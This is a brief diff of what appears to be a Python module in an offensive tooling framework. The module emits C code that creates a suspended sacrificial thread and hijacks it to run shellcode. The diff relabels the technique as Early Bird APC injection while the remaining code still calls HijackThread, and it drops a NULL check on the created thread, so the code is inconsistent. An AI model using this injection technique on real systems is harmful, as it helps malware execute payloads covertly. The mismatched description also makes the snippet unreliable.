@@ -1,5 +1,5 @@
 def desc():
-    return "Use a local Thread Hijack to run the payload"
+    return "Use a local Early Bird APC Injection to run the payload"
 
 def run():
     functions = '''\
@@ -49,9 +49,6 @@ void DummyFunction() {
 
 	// Creating sacrificial thread in suspended state
 	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, NULL);
-	if (hThread == NULL) {
-		return FALSE;
-	}
 
 	// Hijacking the sacrificial thread created
 	if (!HijackThread(hThread, pShellcode, sPayloadSize)) {
